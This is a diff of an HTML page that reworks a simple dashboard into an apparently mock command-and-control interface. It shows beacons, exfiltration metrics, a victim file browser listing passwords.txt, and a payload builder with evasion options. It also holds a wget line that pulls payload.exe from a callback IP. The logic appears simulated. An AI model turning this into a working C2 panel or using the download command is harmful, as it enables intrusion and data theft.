@@ -2,45 +2,291 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Control Dashboard</title>
-  <link rel="stylesheet" href="dashboard.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>C2 Operations Center</title>
+  <link rel="stylesheet" href="dashboard.css?v=2">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://unpkg.com/@phosphor-icons/web"></script>
 </head>
 <body>
-  <div class="dashboard-container">
-    <div class="top-bar">
-      <h1 class="dashboard-heading flicker">🖥️ Control Dashboard</h1>
+
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <i class="ph ph-shield-check"></i>
+      <h2>ThreatOps</h2>
+    </div>
+    <ul class="nav-links">
+      <li class="active"><a href="#" onclick="switchView('view-dashboard', this)"><i class="ph ph-squares-four"></i> Dashboard</a></li>
+      <li><a href="#" onclick="switchView('view-logs', this)"><i class="ph ph-list-magnifying-glass"></i> Audit Logs</a></li>
+      <li><a href="#" onclick="openPayloadModal()"><i class="ph ph-rocket-launch"></i> Payload Builder</a></li>
+      <li><a href="#" onclick="switchView('view-file-explorer', this)"><i class="ph ph-folder-notch-open"></i> File Explorer</a></li>
+      <li><a href="#" onclick="switchView('view-operators', this)"><i class="ph ph-users"></i> Operators</a></li>
+      <li><a href="#" onclick="switchView('view-settings', this)"><i class="ph ph-gear"></i> Settings</a></li>
+    </ul>
+    <div class="sidebar-footer">
+      <a href="index.html" class="logout-btn"><i class="ph ph-sign-out"></i> Terminate Session</a>
+    </div>
+  </aside>
+
+  <main class="main-content">
+    <header class="top-bar">
+      <div>
+        <h1 class="dashboard-heading" id="page-title">Command Center</h1>
+        <p class="dashboard-subtitle" id="page-subtitle">Active Deployments & Telemetry</p>
+      </div>
       <div class="top-buttons">
-        <a href="logs.html" class="logs-button">View Logs</a>
-        <a href="http://127.0.0.1:8080/download_logs" class="logs-button">Download Logs</a>
+        <button class="btn btn-primary" onclick="openPayloadModal()"><i class="ph ph-plus"></i> New Payload</button>
+      </div>
+    </header>
+
+    <div id="view-dashboard" class="view-section active">
+      <div class="metrics-row">
+        <div class="metric-card">
+          <h3>Total Beacons</h3>
+          <p class="metric-value">12</p>
+        </div>
+        <div class="metric-card">
+          <h3>Active Connections</h3>
+          <p class="metric-value text-success">4</p>
+        </div>
+        <div class="metric-card">
+          <h3>Data Exfiltrated</h3>
+          <p class="metric-value">1.4 GB</p>
+        </div>
+      </div>
+
+      <div class="dashboard-panels">
+        <div class="left-column">
+          <div class="panel">
+            <h2>Network Activity</h2>
+            <div class="chart-container">
+              <canvas id="activityChart"></canvas>
+            </div>
+          </div>
+
+          <div class="panel">
+            <h2>Connected Beacons</h2>
+            <div class="table-responsive">
+              <table class="clients-table">
+                <thead>
+                  <tr>
+                    <th>ID</th><th>Target IP</th><th>OS</th><th>Status</th><th>Actions</th>
+                  </tr>
+                </thead>
+                <tbody id="clients">
+                  <tr>
+                    <td class="mono">BCN-01</td><td class="mono">192.168.1.10</td>
+                    <td><i class="ph ph-windows-logo"></i> Windows</td>
+                    <td><span class="badge active">Active</span></td>
+                    <td>
+                      <button class="action-btn" title="Interact"><i class="ph ph-terminal"></i></button>
+                      <button class="action-btn text-warning" title="Sleep"><i class="ph ph-moon"></i></button>
+                      <button class="action-btn text-danger" title="Kill"><i class="ph ph-skull"></i></button>
+                    </td>
+                  </tr>
+                  <tr>
+                    <td class="mono">BCN-02</td><td class="mono">10.0.5.22</td>
+                    <td><i class="ph ph-linux-logo"></i> Linux</td>
+                    <td><span class="badge idle">Sleep</span></td>
+                    <td>
+                      <button class="action-btn" title="Interact"><i class="ph ph-terminal"></i></button>
+                      <button class="action-btn text-warning" title="Sleep"><i class="ph ph-moon"></i></button>
+                      <button class="action-btn text-danger" title="Kill"><i class="ph ph-skull"></i></button>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <div class="right-column">
+          <div class="panel console-panel">
+            <h2>Terminal Controller</h2>
+            <div id="logs" class="logs">
+              <p class="log-info">[System] Secure connection established.</p>
+              <p class="log-info">[System] Awaiting operator input...</p>
+            </div>
+            <div class="console-input-area">
+              <span class="prompt-symbol">root@c2:~#</span>
+              <input type="text" id="command" placeholder="Type command..." autocomplete="off">
+              <button onclick="sendCommand()" class="btn btn-primary">Run</button>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
-    <p class="dashboard-quote">"The future is controlled by those who command the code."</p>
 
-    <div class="dashboard-panels">
-      <div class="panel glass">
-        <h2>Connected Clients</h2>
-        <table class="clients-table">
-          <thead>
-            <tr><th>ID</th><th>IP Address</th><th>Status</th></tr>
-          </thead>
-          <tbody id="clients">
-            <tr><td>1</td><td>192.168.1.10</td><td><span class="status active">Active</span></td></tr>
-            <tr><td>2</td><td>192.168.1.15</td><td><span class="status idle">Idle</span></td></tr>
-          </tbody>
-        </table>
-      </div>
-
-      <div class="panel glass">
-        <h2>Command Console</h2>
-        <div class="console">
-          <input type="text" id="command" placeholder="Enter command...">
-          <span class="cursor">█</span>
-          <button onclick="sendCommand()">Execute</button>
+    <div id="view-logs" class="view-section">
+      <div class="panel">
+        <div style="display: flex; gap: 15px; margin-bottom: 20px;">
+          <input type="text" id="searchLog" placeholder="Search logs by IP, command, or operator..." onkeyup="filterLogs()" style="flex-grow: 1; padding: 10px 15px; background: var(--bg-main); border: 1px solid var(--border-color); color: var(--text-main); border-radius: 6px; outline: none;">
+          <select id="typeFilter" style="max-width: 200px; padding: 10px 15px; background: var(--bg-main); border: 1px solid var(--border-color); color: var(--text-main); border-radius: 6px; outline: none;" onchange="filterLogs()">
+            <option value="ALL">All Events</option>
+            <option value="LOGIN">Logins</option>
+            <option value="COMMAND">Commands</option>
+            <option value="CONNECTION">Connections</option>
+          </select>
         </div>
-        <div id="logs" class="logs"></div>
+
+        <div class="table-responsive">
+          <table class="clients-table">
+            <thead>
+              <tr style="background-color: rgba(0,0,0,0.2);">
+                <th>Timestamp</th>
+                <th>Event Type</th>
+                <th>Source IP</th>
+                <th>Operator / Target</th>
+                <th>Details</th>
+              </tr>
+            </thead>
+            <tbody id="logTableBody">
+              </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div id="view-file-explorer" class="view-section">
+      <div class="panel">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+          <h2><i class="ph ph-hard-drives"></i> Target: BCN-01 (192.168.1.10)</h2>
+          <div class="path-breadcrumb mono">C:\Users\Admin\Documents\</div>
+        </div>
+        <div class="table-responsive">
+          <table class="clients-table">
+            <thead>
+              <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><i class="ph ph-folder text-warning"></i> Secret_Projects</td>
+                <td>--</td><td>Today, 10:42 AM</td>
+                <td><button class="action-btn"><i class="ph ph-folder-open"></i></button></td>
+              </tr>
+              <tr>
+                <td><i class="ph ph-file-text"></i> passwords.txt</td>
+                <td>14 KB</td><td>Yesterday, 4:15 PM</td>
+                <td>
+                  <button class="action-btn text-success" title="Download"><i class="ph ph-download-simple"></i></button>
+                  <button class="action-btn text-danger" title="Delete"><i class="ph ph-trash"></i></button>
+                </td>
+              </tr>
+              <tr>
+                <td><i class="ph ph-file-archive"></i> backup_2026.zip</td>
+                <td>4.2 MB</td><td>Mar 28, 2026</td>
+                <td>
+                  <button class="action-btn text-success" title="Download"><i class="ph ph-download-simple"></i></button>
+                  <button class="action-btn text-danger" title="Delete"><i class="ph ph-trash"></i></button>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div id="view-operators" class="view-section">
+      <div class="metrics-row">
+        <div class="metric-card">
+          <div style="display: flex; align-items: center; gap: 15px;">
+            <div class="avatar"><i class="ph ph-user-circle"></i></div>
+            <div>
+              <h3 style="margin-bottom: 5px; color: var(--text-main); font-size: 18px;">Vikas (admin)</h3>
+              <span class="badge active">Online - Master</span>
+            </div>
+          </div>
+        </div>
+        <div class="metric-card">
+          <div style="display: flex; align-items: center; gap: 15px;">
+            <div class="avatar"><i class="ph ph-user-circle"></i></div>
+            <div>
+              <h3 style="margin-bottom: 5px; color: var(--text-main); font-size: 18px;">Op_Spectre</h3>
+              <span class="badge idle">Offline - Analyst</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="view-settings" class="view-section">
+      <div class="panel" style="max-width: 600px;">
+        <h2>Server Configuration</h2>
+        
+        <div class="setting-row">
+          <div>
+            <h4>Strict OpSec Mode</h4>
+            <p class="log-info">Automatically kill beacons if anomalous activity is detected by defenders.</p>
+          </div>
+          <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
+        </div>
+
+        <div class="setting-row">
+          <div>
+            <h4>Discord/Telegram Alerts</h4>
+            <p class="log-info">Send a webhook ping when a new high-privilege target connects.</p>
+          </div>
+          <label class="switch"><input type="checkbox"><span class="slider"></span></label>
+        </div>
+
+        <div class="setting-row">
+          <div>
+            <h4>Jitter Variance</h4>
+            <p class="log-info">Default percentage of time variance applied to beacon sleep cycles.</p>
+          </div>
+          <select class="form-control" style="width: 100px;">
+            <option>10%</option>
+            <option selected>20%</option>
+            <option>50%</option>
+          </select>
+        </div>
+
+        <button class="btn btn-primary" style="margin-top: 20px;">Save Configuration</button>
+      </div>
+    </div>
+
+  </main>
+
+  <div id="payloadModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2>Generate Payload</h2>
+        <button class="close-btn" onclick="closePayloadModal()"><i class="ph ph-x"></i></button>
+      </div>
+      <div class="modal-body">
+        <form id="payloadForm">
+          <div class="form-group">
+            <label>Target Operating System</label>
+            <select id="osSelect" class="form-control">
+              <option value="windows">Windows (.exe)</option>
+              <option value="linux">Linux (ELF)</option>
+              <option value="mac">macOS (Mach-O)</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Listener / Callback IP</label>
+            <input type="text" class="form-control mono" value="10.10.14.5" required>
+          </div>
+          <div class="form-group">
+            <label>Evasion Techniques</label>
+            <div class="checkbox-group">
+              <label><input type="checkbox" checked> Obfuscate Strings</label>
+              <label><input type="checkbox"> Anti-VM Detection</label>
+              <label><input type="checkbox"> Process Injection</label>
+            </div>
+          </div>
+          <div id="payloadOutput" class="payload-output" style="display: none;">
+            <p>Generation Complete. Download link ready:</p>
+            <code class="mono text-success">wget http://10.10.14.5:8080/payload.exe</code>
+          </div>
+        </form>
+      </div>
+      <div class="modal-footer">
+        <button class="btn" onclick="closePayloadModal()">Cancel</button>
+        <button class="btn btn-primary" id="generateBtn" onclick="simulatePayloadGeneration()"><i class="ph ph-gear-six"></i> Build</button>
       </div>
     </div>
   </div>
+
   <script src="dashboard.js"></script>
 </body>
 </html>
